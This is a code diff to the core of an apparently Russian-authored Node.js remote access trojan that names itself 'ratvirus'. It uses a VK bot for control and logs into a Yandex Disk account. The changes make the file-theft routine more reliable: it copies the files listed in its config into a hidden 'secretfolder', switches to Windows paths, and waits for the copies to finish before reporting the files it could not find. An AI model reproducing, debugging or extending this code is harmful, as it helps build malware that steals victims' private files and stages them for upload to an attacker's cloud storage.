@@ -3,7 +3,6 @@
 const { VKApi, ConsoleLogger, BotsLongPollUpdatesProvider } = require('node-vk-sdk')
 const fs = require("fs-extra")
 const YandexDisk = require('yandex-disk').YandexDisk;
-var disk = new YandexDisk(conf.yandex.login, conf.yandex.password); // доступ по логину и паролю
 fs.exists("./config.json", exist => {
     if (exist) {
         fs.exists("../ratvirus", existfolder => {
@@ -20,15 +19,17 @@ fs.exists("./config.json", exist => {
         ratcore.init({ conf: conf, actconf: actconf })
     }
 })
-const api = new VKApi({
-    token: conf.group.token,
-    logger: new ConsoleLogger()
-})
-let updatesProvider = new BotsLongPollUpdatesProvider(api, conf.group.id)
-updatesProvider.getUpdates(updates => { })
 const ratcore = {}
 ratcore.init = function start(temp) {
     let conf = temp.conf
+    var disk = new YandexDisk(conf.yandex.login, conf.yandex.password); // доступ по логину и паролю
+    const api = new VKApi({
+        token: conf.group.token,
+        logger: new ConsoleLogger()
+    })
+    let updatesProvider = new BotsLongPollUpdatesProvider(api, conf.group.id)
+    updatesProvider.getUpdates(updates => { })
+    temp.disk = disk; temp.api = api
     disk.exists("GRRAT", exist => {
         new Promise(function (resolve) {
             if (!exist) {
@@ -55,6 +56,8 @@ ratcore.init = function start(temp) {
     })
 }
 ratcore.startvirus = function (temp) {
+    let disk = temp.disk
+    let api = temp.api
     let conf = temp.conf
     let actconf = temp.actconf
     let needfiles = conf.files.length
@@ -80,17 +83,22 @@ ratcore.startvirus = function (temp) {
                 new Promise(function (resolve) {
                     for (let index = 0; index < needfiles; index++) {
                         fs.exists(conf.files[index], isexist => {
-                            let lastname = conf.files[index].split("/")
+                            let lastname = conf.files[index].split("\\")
                             lastname = lastname[lastname.length - 1]
                             if (isexist) {
-                                fs.copy(conf.files[index], secretfolder + `/${lastname}`)
+                                fs.copy(conf.files[index], secretfolder + `/${lastname}`).then(resu => {
+
+                                    if (index >= needfiles - 1) {
+                                        resolve(true)
+                                    }
+                                })
                             } else {
                                 nonfinedfiles = nonfinedfiles + conf.files[index] + "\n"
+                                if (index >= needfiles - 1) {
+                                    resolve(true)
+                                }
                             }
                         })
-                        if (index >= needfiles - 1) {
-                            resolve(true)
-                        }
                     }
                 }).then(() => {
                     fs.writeFile(secretfolder + "/nonfinedfiles.txt", nonfinedfiles, err => {
